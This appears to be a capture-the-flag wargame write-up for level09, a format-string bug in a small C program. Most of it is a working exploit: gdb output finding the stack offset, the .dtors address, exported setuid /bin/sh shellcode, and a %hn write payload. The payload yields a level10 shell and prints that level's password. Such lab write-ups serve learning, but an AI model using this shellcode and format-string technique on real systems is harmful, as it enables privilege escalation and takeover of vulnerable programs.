#include <stdio.h>
#include <string.h>

int main(int argc, char **argv) {
    int  pad = 0xbabe;
    char buf[1024];
    strncpy(buf, argv[1], sizeof(buf) - 1); 

    printf(buf);
    
    return 0;
}



(gdb) disass main
Dump of assembler code for function main:
   0x080483a4 <+0>:     push   %ebp
   0x080483a5 <+1>:     mov    %esp,%ebp
   0x080483a7 <+3>:     sub    $0x428,%esp
   0x080483ad <+9>:     and    $0xfffffff0,%esp
   0x080483b0 <+12>:    mov    $0x0,%eax
   0x080483b5 <+17>:    sub    %eax,%esp
   0x080483b7 <+19>:    movl   $0xbabe,-0xc(%ebp)
   0x080483be <+26>:    movl   $0x3ff,0x8(%esp)
   0x080483c6 <+34>:    mov    0xc(%ebp),%eax
   0x080483c9 <+37>:    add    $0x4,%eax
   0x080483cc <+40>:    mov    (%eax),%eax
   0x080483ce <+42>:    mov    %eax,0x4(%esp)
   0x080483d2 <+46>:    lea    -0x418(%ebp),%eax
   0x080483d8 <+52>:    mov    %eax,(%esp)
   0x080483db <+55>:    call   0x80482cc <strncpy@plt>
   0x080483e0 <+60>:    lea    -0x418(%ebp),%eax
   0x080483e6 <+66>:    mov    %eax,(%esp)
   0x080483e9 <+69>:    call   0x80482ec <printf@plt>
   0x080483ee <+74>:    mov    $0x0,%eax
   0x080483f3 <+79>:    leave  
   0x080483f4 <+80>:    ret    
End of assembler dump.
(gdb) r $(perl -e 'print "AAAA"."[%08x]"x(10)')    
Starting program: /levels/level09 $(perl -e 'print "AAAA"."[%08x]"x(10)')
AAAA[bffffe4f][000003ff][0015ed7c][41414141][3830255b][255b5d78][5d783830][3830255b][255b5d78][5d783830][Inferior 1 (process 29781) exited normally]
(gdb) 

offset = 4
写入地址dtors  addr : 0x080494d0 + 4 = 0x080494d4
level9@io:/levels$ objdump -s -j .dtors level09

level09:     file format elf32-i386

Contents of section .dtors:
 80494d0 ffffffff 00000000                    ........        
level9@io:/levels$ 

level9@io:/levels$ export PAYLOAD=$'\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80'
level9@io:/tmp/level9$ export PAYLOAD=$'\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80'
level9@io:/tmp/level9$ mv getenv getenv9
level9@io:/tmp/level9$ ./getenv9 PAYLOAD
PAYLOAD is at 0xbfffffc3
level9@io:/tmp/level9$ 

[addr + 2] : \xd6\x94\x04\x08
[addr]     : \xd4\x94\x04\x08
%[HOB-8]x  : %.49143x
%[offset]$hn: %4\$hn
%[LOB-HOB]x: %.16324x
%[offset + 1]$hn: %5\$hn

level9@io:/levels$ ./level09 $(python -c "print '\xd6\x94\x04\x08\xd4\x94\x04\x08'+'%.49143x%4\$hn%.16324x%5\$hn'")
level10@io:/home/level10$ cat .pass 
VRnsEl7CLtKlchjOLl
level10@io:/home/level10$ 